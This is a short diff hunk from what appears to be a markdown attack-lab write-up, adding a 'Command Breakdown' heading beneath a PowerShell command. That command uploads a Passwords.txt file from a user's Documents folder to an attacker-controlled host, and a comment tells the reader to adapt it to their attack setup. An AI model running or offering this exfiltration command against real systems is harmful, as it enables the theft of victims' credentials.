@@ -146,7 +146,7 @@ This is the full PowerShell command to upload the `Passwords.txt` file to the at
 powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -Method Put -InFile 'C:\Users\IEUser\Documents\Passwords.txt'"
 # ⚠️ Make sure to change the IP address, port number, and file path to match your attack setup.
 ```
-
+### Command Breakdown below:
 <div align="left">
   <sub><strong>(Figure 11)</strong></sub><br>
 
